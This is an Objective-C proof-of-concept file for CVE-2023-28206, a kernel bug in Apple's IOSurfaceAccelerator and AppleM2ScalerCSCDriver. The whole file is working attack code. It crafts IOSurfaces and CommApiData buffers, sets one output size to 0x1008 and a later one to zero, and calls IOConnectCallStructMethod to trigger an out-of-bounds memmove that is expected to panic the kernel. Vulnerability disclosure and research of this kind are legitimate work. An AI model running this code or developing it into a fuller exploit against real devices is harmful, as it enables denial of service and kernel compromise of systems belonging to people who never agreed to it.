//
//  PoC.m
//  IOSABugTrigger
//
//  Created by Linus Henze on 2023-04-08.
//  Copyright © 2023 Pinauten GmbH. Some rights reserved.
//

//
// This is a PoC for CVE-2023-28206, triggering an oob memmove in IosaColorManagerMSR8::getHDRStats_gatedContext
//
// License: MIT
//

#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceTypes.h>
#import <IOSurface/IOSurfaceRef.h>
#import <IOKit/IOKitLib.h>
#import <stdio.h>
#import <assert.h>
#import <stdint.h>
#import <dlfcn.h>
#import "KernelPanic.h"

struct CommApiData {
    uint32_t inType;
    void     *inBuf;
    uint32_t inBufSize;
    uint32_t outType;
    void     *outBuf;
    uint32_t outSize;
};

uint64_t (*prepareTransformBuffersAndOptions)(IOSurfaceRef a, IOSurfaceRef b, CFDictionaryRef dict, bool unk, void *buf);

// This function triggers an oob memmove in IosaColorManagerMSR8::getHDRStats_gatedContext
kern_return_t trigger_memmove_oob_copy(void) {
    void *iosaHndl = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_NOW);
    prepareTransformBuffersAndOptions = dlsym(iosaHndl, "prepareTransformBuffersAndOptions");
    
    NSDictionary *dict = @{
        (__bridge NSString*) kIOSurfaceWidth: @1024,
        (__bridge NSString*) kIOSurfaceHeight: @1024,
        (__bridge NSString*) kIOSurfaceBytesPerElement: @4,
        (__bridge NSString*) kIOSurfaceBytesPerRow: @(1024 * 4),
        (__bridge NSString*) kIOSurfaceAllocSize: @(1024 * 1024 * 4),
        (__bridge NSString*) kIOSurfacePixelFormat: @((uint32_t) 'RGBA'),
        @"HDREnable": @YES,
        
        // This is required for some reason
        @"HistogramPixelBins": @[
            @UINT32_MAX,
            @UINT32_MAX,
            @UINT32_MAX,
            @UINT32_MAX,
            @UINT32_MAX
        ]
    };
    
    IOSurfaceRef srcSurf = IOSurfaceCreate((__bridge CFDictionaryRef) dict);
    memset(IOSurfaceGetBaseAddress(srcSurf), 0xF0, 1024 * 1024 * 4);
    
    IOSurfaceRef destSurf = IOSurfaceCreate((__bridge CFDictionaryRef) dict);
    
    void *dataBuf = malloc(0x170);
    memset(dataBuf, 0, 0x170);
    
    uint64_t rr = prepareTransformBuffersAndOptions(srcSurf, destSurf, (__bridge CFDictionaryRef) dict, 0, dataBuf);
    assert(!rr);
    
    struct CommApiData *apiDat = (struct CommApiData*) ((uintptr_t) dataBuf + 0xD0);
    
    // Tell the kernel we want to do some HDR stuff
    int i = 0;
    uint32_t *pwnData = malloc(0x4000 * 4); // Need to allocate enough space because otherwise...
    pwnData[i++] = 2;      // Number of properties
    pwnData[i++] = 100;    // Size of properties
    pwnData[i++] = 'base'; // Tag
    pwnData[i++] = 4;      // Size of data for this tag
    pwnData[i++] = 0;      // Value
    pwnData[i++] = 'basf'; // Tag
    pwnData[i++] = 4;      // Size of data for this tag
    pwnData[i++] = 0;      // Value
    
    // THIS IS THE REAL TRIGGER
    apiDat[0].inType    = 3;
    apiDat[0].inBuf     = pwnData;
    apiDat[0].inBufSize = 0x4000 * 4;
    apiDat[0].outType   = 2;
    apiDat[0].outBuf    = malloc(0x4000);
    apiDat[0].outSize   = 0x1008; // Tell the kernel that we have 0x1008 bytes of space (this is the minimum)...
    
    apiDat[2].inType    = 3;
    apiDat[2].inBuf     = pwnData;
    apiDat[2].inBufSize = 0x4000 * 4;
    apiDat[2].outType   = 2;
    apiDat[2].outBuf    = malloc(0x4000);
    apiDat[2].outSize   = 0;      // ...and then replace the buffer with one of size zero!
    
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleM2ScalerCSCDriver"));
    assert(service);
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self_, 0, &conn);
    assert(kr == KERN_SUCCESS);
    assert(conn);
    
    IOObjectRelease(service);
    
    kr = IOConnectCallStructMethod(conn, 1, dataBuf, 0x170, NULL, NULL);
    
    // Kernel should have paniced at this point
    assert(false);
    
    return kr;
}
